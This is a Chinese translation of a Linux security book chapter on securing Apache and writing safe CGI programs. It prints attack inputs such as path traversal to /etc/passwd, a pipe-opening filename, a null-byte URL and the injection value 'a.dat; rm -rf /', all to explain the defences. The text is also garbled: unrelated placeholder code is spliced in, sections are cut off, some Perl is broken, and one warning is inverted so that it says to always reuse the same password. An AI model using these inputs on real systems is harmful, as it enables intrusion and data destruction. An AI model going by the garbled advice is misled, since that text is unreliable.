“隐性安全”并非总是坏事，但不应依赖它来保证安全，因为它是不安全的。如果你选择使用“隐性安全”，请仅将其用于获取非致命的信息，并确保创建一个难以猜测的位置，例如：

```
http://www.example.com/my/private/data/paper1/index.html
```

> 警告：永远不要对真正安全的信息实施“隐性安全”。相反，请使用带有 SSL 的 HTTP 认证或其他需要用户名/密码的机制来访问数据。

# 第 12 章：Web 服务器与动态内容

## 不安全的 CGI 配置

| 流行度 | 5 |

| 简单性 | 6 |

| 影响范围 | 6 |

| 风险等级 | 6 |

CGI 是由 Web 服务器运行的程序，它允许程序员动态地提供内容。（我们将在本章的后半部分讨论编写 CGI 程序时的各种安全问题。）有几种方法可以允许 CGI 程序执行，但这些方法都属于两大大类：将 CGI 限制在特定目录，以及为特定文件名启用 CGI。

### 将 CGI 限制在特定目录

允许从任何目录执行 CGI 潜在上是不安全的。想象一下，一个程序员不小心将一个文件命名为 `.cgi` 而不是 `.html`。如果 Web 服务器接收到该文件的请求，它就会被执行。这允许 Web 开发人员在无意中将一个 HTML 文件命名为 `.cgi` 后缀，从而创建一个可执行程序。它还允许坏程序员编写有漏洞的 CGI 程序，并将其放置在 Web 服务器文档树的任何位置，这是一种潜在的安全风险。

标准的 Apache CGI 配置将 CGI 程序限制仅在 CGI 目录内执行。这些目录通常命名为 `cgi-bin` 或 `bin`。这些目录内的所有文件都被视为可执行程序，并由运行 Web 服务器的用户执行。（记住，通常使用 `nobody` 用户）。应该小心放置在这些目录中的文件内容，因为它们在被请求时会被执行。要配置服务器执行其程序目录下的所有文件，请使用 `ScriptAlias` 指令：

```
ScriptAlias /cgi-bin/ "/usr/local/apache/cgi-bin"
```

### 不要根据文件名允许 CGI 执行

也可以根据文件名允许 CGI，通常针对那些具有特定扩展名的文件（常见扩展名为 `.cgi` 和 `.pl`）。这允许程序员将 CGI 程序放置在 Web 服务器目录结构的任何位置，而不仅仅是 `cgi-bin` 等目录。

我们建议将 CGI 程序限制在特定目录。通过将 CGI 限制在特定目录，系统管理员可以在该目录中创建程序，从而限制可以创建 CGI 程序的用户。

用于为文件名扩展启用 CGI 的配置指令是：

```
AddHandler cgi-script .cgi
```

不要使用它。相反，如上所示，仅将 CGI 限制在特定目录。

### Linux 漏洞暴露：Linux 安全秘密与解决方案

> 警告 某些 Linux 安装默认开启了 `AddHandler cgi-script` 指令。检查并确保您的 Linux 配置已注释掉此处理程序，如果没有，请立即将其注释掉或删除。

### 执行旧版本的 CGIs

| 流行度: | 5 |

| 简单性: | 6 |

| 影响范围: | 6 |

| 风险等级: | 6 |

在修改程序时，程序员通常会将文件的上一个版本复制并命名为类似 `program.old` 或 `program.bak` 的名称。结果是 CGI 目录中可能会有同一个程序的多个版本：

```
insert_data.cgi
insert_data.cgi.bak
insert_data.cgi.bak.old
insert_data.cgi.bak.really.old
insert_data.cgi-
#insert_data.cgi
```

最后两个示例是 emacs 自动创建的备份文件。

这是一个非常糟糕的主意。黑客的一种种常见活动是运行一个 CGI 程序，然后给文件名添加 `.bak`，希望获取程序的内容或执行其旧版本。

### 根据名称限制对文件的访问

要根据名称限制文件，请使用 `Files` 或 `FilesMatch` 指令。使用 `Files` 指令时，需要使用波浪 (`~`) 来表示引号内的文本应视为正则表达式。此示例演示了如何拒绝访问所有以 `.bak` 结尾的文件名：

```
<Files ~ "\.bak$">
  Order allow,deny
  Deny from all
</Files>
```

使用 `FilesMatch` 指令时，文本被视为正则表达式。此示例演示了如何拒绝访问所有以 `.old` 结尾的文件名：

```
<FilesMatch "\.old$">
  Order allow, deny
  Deny from all
</FilesMatch>
```

> 注意 当黑客在您的 Web 服务器上发现一个 CGI 程序时，黑客通常会尝试根据文件名寻找这些潜在的备份副本。如果您拒绝访问这些文件，Web 服务器错误日志文件中将生成类似如下的条目：

```
[Wed Dec 27 20:24:19 2000] [error] [client 123.266.7.8]
client denied by server configuration:
/usr/local/apache/cgi-bin/insert.cgi.bak
```

### 不要保留 CGIs 的旧副本

比拒绝访问如 `script.cgi.bak` 等文件名更好的方法是不将旧的 CGI 保留在同一个目录中。将它们移动到不在 Web 服务器树中的不同目录，或从磁盘上删除它们。

### 影响其他网站的不安全 CGIs

| 流行度: 5 |

| --- | --- |



| 简单性: 6 |

| 影响范围: 6 |

| 风险等级: 6 |

如果 Apache Web 服务器配置为使用 `<VirtualHost>` 指令托管多个网站（参见 http://apache.org/docs/core.html#virtualhost），并且如果所有的虚拟主机都使用同一个用户（通常是 `nobody`）运行 CGI 程序，那么一个虚拟主机上编写得糟糕的 CGI 程序可能会导致所有虚拟主机出现安全问题。黑客可以利用这一点重写文件、更改数据库、删除文件。

## 以不同用户运行 CGIs

使用 SuExec（参见 http://apache.org/docs/sec.html），每个虚拟主机可以配置为通过 Web 主管选择的用户（通常是 `nobody`）来执行。如果 CGI 编写得糟糕，该 CGI 造成的损害将受到该用户权限的限制。例如，如果虚拟主机 `bad_program.com` 在 Apache 配置文件中定义了以下用户：

## 攻击配置不当的 HTTP 认证

| 流行度 | 6 |

| --- | --- |

| 简单性 | 7 |

| 影响范围 | 6 |

| 风险等级 | 6 |

前所述，HTTP 认证通过要求用户名和密码来限制对目录的访问。在 Apache 中，实现 HTTP 认证有两种方法：使用 `.htaccess` 或使用 `httpd.conf`。不安全的配置 HTTP 认证很容易，从而允许黑客利用该漏洞。如果配置不安全，黑客可以访问本应需要认证的目录。此外，如果配置不当，黑客可以获取 HTTP 认证密码，然后进行破解。

### 安全使用 .htaccess 文件进行 HTTP 认证

允许 HTTP 认证的一种方便方法是配置服务器，让 Web 开发人员在其限制的目录中放置名为 `.htaccess` 的文件。要配置服务器允许使用 `.htaccess`，请使用 `AllowOverride AccessFileName` 指令。`AllowOverride` 控制 `.htaccess` 可以覆盖的选项。（当 `.htaccess` 用于用户认证时，使用 `AuthConfig` 值。）

```
AllowOverride  AuthConfig
```

要指定 `.htaccess` 管理文件访问的文件名，请使用 `AccessFileName` 指令：

```
AccessFileName .htaccess
```

如果使用了 `.htaccess`，服务器永远不应提供该文件，因为它包含了服务器如何配置的信息。因此，通过使用 `Files` 指令，必须配置服务器使其不会交付该 `.htaccess` 文件：

```
<Files .htaccess>
  Order allow,deny
  Deny from all
</Files>
```

# 第 12 章：Web 服务器与动态内容

`.htaccess` 文件告诉服务器 HTTP 身份验证密码文件的位置等信息。一个示例 `.htaccess` 文件的内容如下：

`AuthUserFile /usr/local/apache/misc/.htaccess_passwd`

`AuthGroupFile /dev/null`

```
<Limit GET>
require user jdoe
</Limit>
```

`AuthUserFile` 指令指向包含用户名/密码组合的文件。该文件的内容类似于：

`jdoe:password`

该行显示了 `jdoe` 的加密密码。正如第 9 节所示，该文件是用 `htpasswd` 程序创建并维护的。创建一个新的 HTTP 密码文件：

```
htpasswd -c .htaccess_passwd jdoe
```

> 警告正如第 9 节所示，永远为 HTTP 验证和 Linux 机器使用相同的密码。向此文件中添加用户时不要使用 `-c`（创建）选项。这里是添加用户 `jsmith` 的示例

```
htpasswd .htaccess_passwd jsmith
```

> 注意包含用户名/密码组合的文件绝不放在文档树目录内（上面我们将其放在了 `/usr/local/apache/misc`，这不在 `htdocs` 中）。如果该文件位于文档树，它可以作为文本文件提供，向黑客交付用户名和密码。黑客可以使用简单的密码破解程序破解这些密码（正如第 9 节所示）。

# 使用 httpd.conf 进行 HTTP 身份验证

`.htaccess` 的替代方案是使用 `httpd.conf` 配置 Web 服务器。这是一个更安全的 HTTP 身份验证实现方式，因为它不允许任意创建 `.htaccess` 文件。此外，对 `httpd.conf` 的控制完全属于 `root` 用户。`httpd.conf` 中的以下指令将实现 HTTP 身份验证：

```
<Directory /usr/local/apache/htdocs/private_dir>
  AuthType Basic
  AuthName "Private Directory"
  AuthUserFile /usr/local/apache/misc/.passwd
  require valid-user
</Directory>
```

当请求 `http://localhost/private_dir/` 时，将提示输入用户名和密码。**注意** 如上，HTTP 身份验证密码文件并不位于文档树中。

# 利用默认配置漏洞

| 特性 | 评分 |

| --- | --- |

| 流行度 | 5 |

| 简单性 | 6 |

| 影响 | 5 |

| 风险等级 | 5 |

安装 Linux 发行版时，它有一个默认配置。根据情况，默认配置可能是不安全的。黑客了解这些配置并知道如何收集有关 Web 服务器的信息以及如何利用漏洞。配置 Apache 第一步是检查默认配置并关闭你不需要的功能。以下是几个发行版的配置示例，你的发行版可能不会包含所有这些。然而，建议将它们关闭。

## 移除在线手册

许多发行版在 Web 文档树中安装手册。这是危险的，因为可以向黑客提供有关你安装的信息。例如，此配置是 SuSE 的默认配置：

```
Alias /hilfe/ /usr/doc/susehelp/
Alias /doc/ /usr/doc/
Alias /manual/ /usr/doc/packages/apache/manual/

<Directory /usr/doc>
  Options FollowSymLinks
  AllowOverride None
</Directory>
```

此配置的问题在于，通过 http://www.example.com/doc/ 可以在 Web 上查看文档树的内容和手册。这为黑客提供了关于机器上安装的软件的大量信息。此外，由于存在 `/hilfe/`，黑客会知道 ![](img/33829ffb1435b4baef56cd2c28ec6cd_467_0.png) 是 SuSE 发行版，因为它是唯一的此类默认。（Hilfe 在德语中意思是“帮助”，而 SuSE 位于德国。）此配置属于“提供过多信息”类别。

## 移除默认首页

许多发行版（如 RedHat）在文档树根目录下提供默认的 `index.html`，欢迎访问者使用 RedHat 操作系统。此类页面也属于（提供过多信息）类别，应该被或更改。

## 根据文件名执行 CGI

如前所述，允许根据文件名扩展执行文件是一个可能的安全问题。配置此常见配置的指令为：

```
AddHandler cgi-script .cgi
```

这应该被移除。

## 解析 HTML 文件

解析 HTML 文件也称为服务器端包含（SSIs），是预处理过的 HTML 文件，允许 Web 服务器包含其他文件或执行外部程序生成 HTML 内容。配置 SSIs 的指令为：

```
AddType text/html .shtml
AddHandler server-parsed .shtml
AddHandler server-parsed .html
```

由于 SSIs 允许任何用户（包括 Web 服务器）……

## 配置解析 HTML 文件

Apache 可以同时作为 Web 服务器和 HTTP 代理运行。此功能应被限于一组受信任的机器。否则，攻击者可以滥用。

## 配置解析 HTML 文件

Apache 可以通过以下指令显示服务器状态和信息：

```
<Location /status>
SetHandler status
Order deny, allow
Deny from all
Allow from
```

## 配置代理目录

- 匿名浏览：攻击者可以“跳转”他的代理服务器，使 Web 服务器看起来是违规方。
- 浏览无法访问的站点：黑客机器通常被禁止访问某些站点，但他可以通过你的代理访问。

## 安全代理服务器指令

你可以快速测试 Apache 服务器以查看它是否允许代理。从外部机器连接到 Web 服务器的 80 端口：

```
external$ nc webserver 80
GET http://www.hackinglinuxexposed.com/ HTTP/1.0
```



进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```

如果你收到了我们网页的 HTML，你的 Apache 服务器可能配置错误。如果不需要 Web 代理，请确保注释掉或移除以下部分：

```
<Directory proxy:*>
Order deny, allow
Deny from all
Allow from .example.com
</Directory>
```

# CGI 程序的问题

CGI 程序允许开发者创建提供 Web内容的复杂程序。这为动态生成信息提供了更强大、更灵活的方法。然而，如果 CGI 程序编写得不当，就会受到安全攻击的影响。在本节中，我们将检查黑客可能发起的某些攻击，并且我们

# Linux 破解公开：Linux 安全秘密与解决方案

讨论处理 CGI 的通用方法，以及 CGI 程序员可能做出的假设，这些假设会导致产生漏洞的程序。

## 利用预装和下载的 CGIs

| 流行度 | 5 |

| 简单性 | 6 |

| 影响范围 | 7 |

| 风险等级 | 6 |

随 Web 服务器分发或从脚本存档下载的 CGI 通常编写得很糟糕，这使得它们成为安全攻击的目标。一位著名的安全专家 Rain Forest Puppy (`http://www.wiretrip.net/rfp/`) 编写了一个名为 Whisker 的 CGI 扫描器。Whisker 是一个可以扫描已知的编写不当且包含安全问题的 CGI 的工具。此类程序的数量很大。在 Security Focus (`http://www.securityfocus.com`) 上快速搜索就发现了几乎 100 个这样的程序。黑客对这些编写糟糕的程序非常熟悉，并知道如何利用它们。

一个预装 CGI 的完美例子是 `nph-finger` CGI 程序，它是随 NCSA 和早期 Apache（1.1.3 之前的版本）分发的。该程序的源代码如下：

```bash
#!/bin/sh

echo HTTP/1.0 200 OK
echo Content-type: text/plain
echo Server: $SERVER_SOFTWARE
echo

echo CGI/1.0 test script report:

echo argc is #$. argv is "$*"
echo

echo SERVER_SOFTWARE = $SERVER_SOFTWARE
echo SERVER_NAME = $SERVER_NAME
echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE
echo SERVER_PROTOCOL = $SERVER_PROTOCOL
echo SERVER_PORT = $SERVER_PORT
echo REQUEST_METHOD = $REQUEST_METHOD
echo HTTP_ACCEPT = "$HTTP_ACCEPT"
echo PATH_INFO = $PATH_INFO
echo PATH_TRANSLATED = $PATH_TRANSLATED
```

```bash
echo SCRIPT_NAME = $SCRIPT_NAME
echo QUERY_STRING = $QUERY_STRING
echo REMOTE_HOST = $REMOTE_HOST
echo REMOTE_ADDR = $REMOTE_ADDR
echo REMOTE_USER = $REMOTE_USER
echo CONTENT_TYPE = $CONTENT_TYPE
echo CONTENT_LENGTH = $CONTENT_LENGTH
```

黑客可以通过以下方式在查询字符串中传递星号（*）来执行此程序：

`http://www.example.com/cgi-bin/nph-finger.cgi?`

星号将通过 `QUERY_STRING` 传递到程序并解析，显示 CGI 目录下的文件列表，如图 12-2 所示。注意目录显示了几个 CGI 程序：`admin.cgi`、`db.cgi` 和 `private.cgi`。这些程序可能具有有趣的用途，现在黑客已经发现了它们，并可以尝试执行它们。

![](img/33829ffb1435b4baef56fcd2c28ec6cd_472_0.png)

图 12-2. `nph-finger.cgi` 生成的目录列表

## 不要信任预装和下载的 CGIs

这里有三个规则需要遵循：第一，删除随 Web 服务器分发的 CGI。第二，如果不是你写的，且你没有彻底检查它们，就删除它们。第三，不要去流行的 Web 脚本存档（包括免费和付费软件）下载并使用脚本；要编写自己的。

同样的规则适用于其他动态内容生成器，如 `mod_perl`、`php3` 和 `servlets`。

## 不安全的 CGI 程序

编写糟糕的 CGI 程序会导致负面结果，范围从简单的文件覆盖到严重的妥协，再到黑客获得 root 权限。在这里，我们将检查 CGI 程序的常见问题以及如何避免编写不安全的程序。

大多数 CGI 程序问题分为两类：

-   做出错误的假设
-   执行操作系统程序并向操作系统打开管道

接下来的多数示例 CGI 程序都是用 Perl 编写的，因为 Perl 是编写 CGI 程序最流行的语言之一。然而，错误的假设和管道问题不仅限于 Perl。用任何语言编写的程序都可能遭受编写不当和错误假设的影响。

## 假设接收到的字段是预期的

| 流行度 | 7 |

| --- | --- |

| 简单性 | 6 |

| 影响范围 | 5 |

| 风险等级 | 6 |

永远不要假设只会收到预期的表单字段。简单的 HTML 页面创建一个表单并将表单数据发送到 CGI 程序：

```html
<html>
<head>
<title>Bad Assumptions: Example 1</title>
</head>
<body>
Bad Assumptions: Example 1
<form action="/cgi-bin/example1.cgi">
Name: <input type="text" name="name">
<br>
```

```html
Phone: <input type="text" name="phone">
<br>
<input type="submit">
</form>
</body>
</html>
```

如果 CGI 程序的作者假设接收到的字段只有 `name` 和 `phone`，这可能是错误的。黑客很容易使用不同的或额外的字段执行 `example1.cgi` 程序。黑客有多种方法：

-   通过在浏览器地址栏中输入相应的键值对使用 GET 方法运行 CGI 程序：

`http://localhost/cgi-bin/example1.cgi?name=John&phone=1234567&data=bad+data`

注意 `name`, `phone` 和 `data` 都传递了值，尽管 `data` 不是 HTML 表单中的字段。

-   通过 telnet 连接运行 CGI 程序：

```
$ telnet localhost 80

Trying to connect to 127.0.0.1...

Connected to localhost.

Escape character is '|'.

GET /cgi-bin/example1.cgi?name=John&phone=1234567&data=bad+data HTTP/1.0
```

-   使用独立程序进行 post 连接：

```perl
#!/usr/bin/perl -w

use HTTP::Request::Common (POST);
use LWP::UserAgent;

$ua = LWP::UserAgent->new();
my $req = POST 'http://localhost/cgi-bin/example1.cgi',
    name => 'John', phone => '312.555.1212',
    data => 'bad data';

$content = $ua->request($req)->as_string;
print $content;
```

这三种方法可以滥用仅接收预期字段的假设，还可以利用后续章节讨论的许多假设。

这是一个糟糕 Perl 代码的真实示例。变量基于字段 name 将存储在变量 `$name` 中；字段 phone 将存储在变量 `$phone` 中：

```perl
@params = $query->param(@params);
foreach $param (@params) {
    $param = $query->param($param);
}
```

通过此代码，黑客只需在发送到服务器的查询字符串中包含此内容，即可创建他们想要的任何变量：

```
http://www.example.com/cgi-bin/example.cgi?new_var=test
```



考虑如果包含 Perl 代码的程序有一个包含 `sendmail` 路径（通常为 `/usr/lib/sendmail`）的变量 `SEND_MAIL` 会发生什么。要使用不同的程序发送邮件，黑客可以使用：

```
http://www.example.com/cgi-bin/example.cgi?SEND_MAIL
```

通过以下方式解决上述代码问题：

```perl
foreach $param (@params) {
  $name = $query->param('name');
  $phone = $query->param('phone');
}
```

## 始终检查字段

| 流行度 | 6 |

| 简单性 | 7 |

| 影响范围 | 5 |

| 风险等级 | 6 |

另一个错误的假设是信任隐藏字段。隐藏字段通常用于从服务器传递信息到客户端，但通过文档源很容易读取。这是一个通过隐藏字段传递名称和价格的网页示例：

```html
<html>
<head>
<title>Bad Assumptions: Example 2</title>
</head>
<body>
Bad Assumptions: Example 2
<form action="cgi-bin/example2.cgi">
Name: <input type="text" name="name">
<br>
Phone: <input type="text" name="phone">
<br>
<input type="hidden" name="product" value="Widget A">
<input type="hidden" name="price" value="39.99">
<input type="submit">
</form>
</body>
</html>
```

通常情况下，使用隐藏字段是从一个 CGI 程序传递数据到另一个程序的非简单方法。一种更复杂的方法是创建一个包含随机 session ID 的 cookie，并在服务器上的数据库中保留该会话的相关数据（该数据的键是 session ID）。

如果 CGI 程序盲目接受产品名称和价格，那么它就受到上述技术的影响。黑客可以轻松更改产品名称或价格以获得优势。

## 使用 MD5 验证隐藏字段

为了确保通过隐藏字段往返的数据未更改，可以使用 MD 验证。MD5 是一种将文本编码为字符字符串的算法（我们称之为摘要）。在下面的示例中，三个信息——放置在隐藏字段中的产品名称、放置在隐藏字段中的价格以及一个秘密密码——被传递给 `md5_base64()` 以生成摘要。只有当你拥有这三个原始信息时才能重现此摘要；由于密码是秘密且存储在服务器上，黑客仅凭产品名称和价格无法产生摘要。这里是创建摘要的示例：

```perl

#! /usr/bin/perl -w

use Digest::MD5 qw ( md5_base4 );

$passphrase = 'A VERY difficult to guess passphrase';

$product = 'Widget A';

$price = '30.00';

digest = md5_base64($product
```

# Linux 破解破解：Linux 安全秘密与解决方案

执行此代码将产生以下输出：

```
machine1$ ./md5.pl

r8U4dDJNCYo2CBpEEpG064Q
```

使用此类代码创建的摘要可以作为隐藏字段添加到表单中：

```html

<html

<head>

<title>错误的假设：示例 3</title>

</head>

<body>

错误的假设：示例 3

<form action="/cgi-bin/example3.cgi">

Name: <input type="text" name="name">

<br>

Phone: <input type="text" name="phone">

<br>

<input type="hidden" name="product" value="Widget A">

<input type="hidden" name="price" value="39.99">

<input type="hidden" name="digest" value="r8U4dDJNCYo2CBpEEpG064Q">

<input type="submit">

</form>

</body>

</html
```

当此表单提交到 CGI 程序时，该程序将获取提交的产名称和价格，并将这些信息连同秘密密码传递给 `md5_base64()` 函数。如果创建的摘要与表单提交的内容匹配，我们就知道产品名称和价格没有被更改。

# 信任用户输入的长度

| 流行度: | 5 |
| :--- | :--- |
| 简单性: | 6 |
| 影响: | 5 |
| 风险评分: | 5 |

通过指定 `maxlength` 来限制用户在表单文本框中输入大量数据是常见的做法：

```html

<html

<head>

<title>错误的假设：示例 4</title>

```
# 第 12 章：Web 服务器与动态内容

```
</head>

<body>

错误的假设：示例 4

<form action="/cgi-bin/example4.cgi">

Name: <input type="text" name="name" maxlength="40">

<br>

Phone: <input type="text" name="phone">

<br>

<input type="submit">

</form>

</body>

</html
```

程序员假设名称的最大长度为 40 个字符。假设她的程序使用 `printf("%40s", name)` 将名称写入文件。如果名称超过 40 个字符，此 `printf()` 将覆盖下一个字段中的数据。如果下一个字段是加密密码或其他某些信息，这可能会造成损害。

或者，数据可能被写入 SQL 数据库，程序员允许在数据库中放置任意数量的字符，而黑客提交了一个长度为 10MB 的名称。又或者 CGI 程序是用 C 语言编写的；使用超过 40 个字符的名称会导致缓冲区溢出，允许黑客运行任意代码。黑客可以轻松地向 CGI 程序提交超过 40 个字符的数据。

# 始终检查数据长度

始终检查你收到的数据长度，要么报错要么截断数据。这在 Perl 中可以很容易实现：

```perl

if (length($posted_data) <= 40) {

    process();

} else {

    complain();

}
```

| 流行度: | 6 |
| :--- | :--- |
| 简单性: | 6 |
| 影响: | 5 |
| 风险评分: | 6 |

`Referer` 请求头不应被信任，原因与其他所有请求头信息都不应被信任一样；它们可以轻易被黑客滥用。

# Linux 破解破解：Linux 安全秘密与解决方案

> 注意：是的，是 referer 而不是 refer。HTTP 协议的原始规范将 "referrer" 拼错为 "referer"，这导致了各种困惑并让作业作业扣分。但这就是官方拼写，也是我们在这里使用的写法。

`Referer` 是用户在点击带他进入新页面的链接时所在的网页。这对于告诉网站所有者用户是如何找到他们的网站的来说非常有用的信息。因此，他们可能根据这些信息分配广告预算等资源。

然而，`Referer` 位于头部中，我们已经见过黑客如何向头部中放置错误信息。

```
$ telnet localhost 80

Trying 127.0.0.1...

Connected to localhost...

Escape character is '^'

GET /cgi-bin/cgi?name=example.1name=John&phone=1234567&data=bad+data HTTP/1.1

Host: localhost

Referer: http://www.example.com/trusted.html
```



至少，这会导致网站所有者错误地分配广告资金。最坏的情况下，它可能会成为一个安全问题。

假设一个懒惰的程序员有一个表单，并且不想使用上述方法验证数据。如果他检查头部头并确定 `referer` 指明它是从他的表单提交的，他错误地认为自己可以信任这些数据。在这个例子中，程序员认为 `referer` 为他的 CGI 程序提供了安全保障，但实际上它可能并没有，因为黑客可以伪造这些信息。

# 不要依赖 Referer 请求头

将 `referer` 视为一种有用的信息，但不是唯一的指标。

| 流行度: | 6 |
| :--- | :--- |
| 简单性: | 5 |
| 影响: | 5 |
| 风险评分: | 5 |

`Cookies` 允许网站维持状态。

# 利用对 Cookie 中的信任

你不应该做的假设之一是文件名是可以信任的。黑客可以轻易在文件名放入元字符或其他坏东西。例如，假设表单有一个隐藏字段：

```html
<input type="hidden" name="filename" value="file">
```

CGI 程序如下打开此文件：

```perl
$filename = '/path/to/files/' . $postedfilename;
open FH, $filename;
```

## Linux 破解：安全秘密与解决方案

一个聪明的黑客可以提交文件名 `../../../etc/passwd`。此文件名将从 `/path/to` 遍历目录到 `/etc/passwd`。如果黑客获得了此文件的副本，她将拥有机器上所有用户的列表以及可能的全部加密密码（见第 9 章）。

或者黑客可以提交文件名 `../../bin/cat/etc/passwd`。该字符串执行打开操作系统的管道。另一种常见的文件名破解手段是输入一个打开管道而不是文件的字符串。例如，如果黑客调用此程序：

```perl
open FH, "$postedfilename" or die $;
while (<FH>) {
    # 处理并打印文件
```

使用 URL `http://www.example.com/cgi-bin/example.cgi?file=cat%2Fetc%2Fpasswd%7C`，`$postedfilename` 的值将是 `/etc/passwd`。在那里，结果输出将是：

```
open FH, "cat /etc/passwd";
```

这最终向黑客显示了 `/etc/passwd`。

> 当在 URL 中发送时，`$2F` 被解码为 `/`.

### 以显式读取模式打开文件

`open()` 函数默认以读模式打开文件。永远不要这种默认行为。相反，在显式读取模式下：

### 验证文件名中的字符

始终检查文件名中的字符。在上面的案例中，输入包含垂直线 (`|`)。如果文件名包含字母、数字、下划线、点或其他允许字符以外的任何字符，则不应用于 `open()` 函数调用。

# 提交的输入包含空字符

| 流行度: | 4 |
| :--- | :--- |
| 简单性: | 6 |
| 影响: | 5 |
| 风险评分: | 5 |

## 第 12 章：Web 服务器与动态内容 451

黑客可以很容易发送危险字符作为数据输入。一个可能导致问题的特定恶性字符示例是空字符 (`\0`)。`Perl`（与 C 不同）允许字符串包含空字符。然而，如果该字符串传递给系统库函数——在 C 语言中——空字符将被视为字符串终止符。想象有一个如下代码的程序：

```
$file = $query->param('file') . '.html';
open F, $file;
```

这段代码在调用类似 `http://www.example.com/cgi-bin/example.cgi?file=1.html` 的 URL 时执行。

然而，如果黑客使用带有空字符的字符串调用程序，并将 `"file=%2Fetc%2Fpasswd%00.html"` 传递给 `open()` 函数，字符串将由 C 函数处理，该函数将空字符解释为字符串终止符；因此，C 函数看到的字符串是：

> `"/etc/passwd"`

黑客现在拥有密码文件的副本。

- **注意** 有关此问题的详细描述，请参考 Rain Forrest Puppet 在 `http://phrack.infonexus.com/search.php?view&article=p55-7` 写的优秀文章。

### 验证输入中的字符

在打开文件之前，始终检查表单数据以确定其只包含预期的字符。

### 滥用 JavaScript 预处理

| 流行度: | 4 |
|---|---|
| 复杂度: | 6 |
| 影响: | 5 |
| 风险等级: | 5 |

`JavaScript` 用于数据的客户端预处理。你的网页可以包含在用户浏览器上执行的 `JavaScript` 代码，处理、检查并清理输入的数据。例如，假设你有一个收集访问者地址的表单。其中一个信息是电话号码。可以在网页中添加 `JavaScript` 来在客户端检查该电话号码，并验证其长度至少为 10 个字符且全为数字（此示例仅限于符合此描述的格式，如美国，但可以轻松扩展到其他国家的格式）。如果数据不符合你的预期，可以警告用户允许其修复。在验证数据格式正确后，`JavaScript` 代码可以将数据提交给 CGI 程序。

此外，`JavaScript` 代码可以清理或修改数据以符合 CGI 程序的精确要求。例如，如果用户输入的电话号码是

312-555-1212

`JavaScript` 代码可以通过将其修改为 CGI 程序期望的格式：

(312) 555-1212

黑客只需通过在浏览器中“查看页面源代码”即可轻松判断网页是否使用 `JavaScript` 进行预处理。在得知页面经过预处理后，黑客可以在不通过上述浏览器处理的情况下直接将数据提交给 CGI 程序，并将格式错误或完全虚假的数据传递给程序，希望其造成危害。对于上述电话号码的情况，黑客可以提交一个非常长的字符串，希望长字符串会导致数据服务器崩溃。

### 永远不要假设发生过预处理

CGI 程序永远不能假设收到的数据是正确的格式。虽然使用 `JavaScript` 检查和清理数据对于没有恶意意的用户效果良好，但你不能假设你的程序每次被调用时都没有恶意意，或者用户都是浏览器中开启了 `JavaScript` 的用户。因此，你的程序也应该检查数据的格式，并在必要时进行修改。

### 利用系统调用和管道

| 流行度 | 6 |
| 复杂度 | 6 |
| 影响 | 6 |
| 风险等级 | 6 |

CGI 程序经常需要执行系统调用来执行外部程序。例如，一个 CGI 程序接收提交给它的信息并将其发送给管理员。程序可能使用 `sendmail` 发送邮件，这需要通过操作系统执行 `sendmail`。

系统调用通常通过使用 `system()` 函数或通过管道到文件句柄（`filehandle`）来实现。这两种方案都容易受到安全攻击。

假设你有一个 CGI 程序，它从一个提交了文件名的表单中执行。该 CGI 程序将获取文件名，使用 `wc` 命令确定该文件的字符数，并将该数字打印到标准输出。假设 CGI 程序已确定提交的文件名并将其赋值给变量 `$file`。你可以使用 `system()` 来打印字符数：

```
system("wc -c $file");
```

这看起来足够无害，但如果用户在文本框中输入以下内容呢？

```
a.dat; rm -rf /
```

执行的命令将是

```
wc -c a.dat; rm -rf /
```

这也可以通过反引号来打印字符数：

```
$num_chars = `wc -c $file`;
print $num_chars;
```

再次，用户可以在文本框中输入以下内容：

```
a.dat; rm -rf /
```

这可能是一个问题。
打开管道时也存在类似的问题。在 `Perl` 中，可以打开管道并从文件句柄读取。这段代码使用管道实现了上述 `wc` 命令：

```
open P, "wc -c $file |";
print $num_chars;
```

再次，用户可以在文本框中输入以下内容：

```
a.dat; rm -rf /
```



这可能是一个问题。
（注：原文后续存在大量重复的 OCR 错误，已根据要求进行去重和合并。）

# 其他 LINUX WEB 服务器

你可以保护自己的安全。或者更好的办法是获取你自己的高速连接（T1 或电缆调制解调器）并进行自托管。

目前有许多 Linux Web 服务器可供选择。到目前为止，最常用的 Web 服务器是 Apache；因此，在本章中，我们几乎只讨论如何安全地配置和使用 Apache。Linux 上也可以还可以使用其他几种 Web 服务器，下文介绍。

- [Jigsaw](http://www.w3.org/Jigsaw) 该服务器由世界维网联盟（W3C）开发并用 Java 实现。它提供了针对 HTTP/1.1 协议的功能。它的初衷是一个技术演示，而不是一个功能完整的 Web 服务器，尽管在 2.0 版本中，它的功能比许多其他可用 Web 服务器都要多。我们目前不建议在任务关键型网站上使用 Jigsaw，但它确实展示了某些特性和网络技术。
- [httpd](http://www.acme.com/software/httpd) 这个微型/节流型 HTTP 服务器 `httpd`（也被称为漫画《布鲁姆县》中的“比猫”）是一个简单、小巧、便携、快速且安全的 HTTP 服务器。它内置了节流功能，允许你根据 URL 或 URL 查询字符串指定最大速率。
- [AOL Server](http://www.aolserver.com/) 一种多线程、支持 Tcl 的 Web 服务器，用于大型动态网站。它由美国在线（AOL）创建，驱动着 AOL 旗下的站点，如 AOL_COM、Digital City、AOLMail、AOL Hometown、Helping.org、AOL Search 等。AOL Server 在 GPL 协议下分发，尽管它是由一家大公司开发的。
- [bash-httpd](http://linux.umbc.edu/~mazbug1/bash-httpd.html) `bash-http` 由 Mordechai Abzug 编写，是一个用 bash（GNU Bourne Shell）编写的 Web 服务器。它并不具备备其他 Web 服务器中的许多功能；它运行缓慢且不安全，不建议在生产环境中使用。Abzug 先生为什么要写它？因为这个主意很酷。
- [awk-httpd](http://awk.getge.net/htdocs/README.html) 另一个完全用 AWK 编写的趣味服务器。它不建议用于生产环境，因为它运行缓慢、不安全，且只实现了 HTTP 协议的一部分。这个程序说明了如果你想写，你可以用 AWK 写任何东西。但这个程序也提出了一个问题：“你为什么要想用 AWK 写任何东西呢？”

# 总结

你可以采取几个步骤，这些步骤对提高你的网站安全性将非常有帮助：

- 1. 使用安全的 Web 服务器，当发现安全漏洞时可以快速进行升级。（Apache 非常符合这一描述。）这包括你添加到基础软件中的其他插件/模块，如 `mod_perl`、`mod_php4` 等。
